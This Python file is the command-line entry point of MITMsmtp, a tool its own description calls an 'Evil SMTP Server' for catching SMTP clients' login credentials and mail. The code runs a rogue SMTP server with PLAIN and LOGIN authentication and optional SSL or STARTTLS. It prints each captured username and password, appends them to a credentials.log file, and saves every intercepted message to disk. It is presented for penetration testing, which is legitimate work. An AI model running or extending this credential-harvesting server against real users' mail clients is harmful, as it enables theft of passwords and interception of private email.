from MITMsmtp import MITMsmtp

from MITMsmtp.auth.authHandler import authHandler #Authentication methods
from MITMsmtp.auth.authLogin import authLogin
from MITMsmtp.auth.authPlain import authPlain

import argparse, sys
from datetime import datetime
import time

class MailLog:
    def __init__(self, directory=None):
        self.directory = directory

    def loginCallback(self, message, username, password):
        print("=== Login ===")
        print("Username: " + username)
        print("Password: " + password + "\n")
        if (self.directory != None):
            with open(self.directory + "/credentials.log", "a+") as log:
                log.write("[%s] %s:%s (%s)\n" % (datetime.now().strftime("%d.%m.%Y %H:%M:%S"), username, password, message.client_name))

    def messageCallback(self, message):
        output = """=== Complete Message ===\nUsername  : %s\nPassword  : %s\nClient    : %s\nSender    : %s\n""" % (message.username, message.password, message.client_name, message.sender)

        recipient_count = 0
        for recipient in message.recipients:
            if recipient_count == 0:
                output += "Recipients: " + recipient
            else:
                output += "            " + recipient
            recipient_count+=1

        print(output)
        if (self.directory != None):
            with open("%s/%s.log" % (self.directory, datetime.now().strftime("%d-%m-%Y_%H:%M:%S")), "w+") as log:
                log.write(output + "\n\n")
                log.write(message.message)

def main(args=None):
    parser=argparse.ArgumentParser(description="MITMsmtp is an Evil SMTP Server for pentesting SMTP clients to catch login credentials and mails sent over plain or SSL encrypted connections.")
    parser.add_argument('--server_address', default="0.0.0.0", help='IP Address to listen on (default: all)')
    parser.add_argument('--port', default=8587, type=int, help='Port to listen on (default: 8587)')
    parser.add_argument('--STARTTLS', action='store_true', help='Enables and requires STARTTLS Support (default: False)')
    parser.add_argument('--SSL', action='store_true', help='Enables SSL Support (default: False)')
    parser.add_argument('--certfile', default=None, help='Certfificate for SSL Mode (default: Default MITMsmtp Certificate)')
    parser.add_argument('--keyfile', default=None, help='Key for SSL Mode (default: Default MITMsmtp Keyfile)')
    parser.add_argument('--log', default=None, help='Directory for mails and credentials')
    parser.add_argument('--disable-auth-plain', action='store_true', help='Disables authentication using method PLAIN (default: False)')
    parser.add_argument('--disable-auth-login', action='store_true', help='Disables authentication using method LOGIN (default: False)')

    args=parser.parse_args()
    log = MailLog(args.log)

    auth = authHandler() #Initialize supported authMethods
    if (not args.disable_auth_plain):
        auth.addAuthMethod(authPlain)
    if (not args.disable_auth_login):
        auth.addAuthMethod(authLogin)

    server = MITMsmtp.MITMsmtp(args.server_address, args.port, auth, args.STARTTLS, args.SSL, args.certfile, args.keyfile) #Create new SMTPServer

    messageHandler = server.getMessageHandler() #Get Message Handler
    messageHandler.registerLoginCallback(log.loginCallback) #Register callback for login
    messageHandler.registerMessageCallback(log.messageCallback) #Register callback for complete messages

    server.start() #Start SMTPServer
    print("Waiting for messages\n")
    try:
        while (True): time.sleep(5)
    except KeyboardInterrupt:
        pass
    server.stop() #Stop SMTPServer
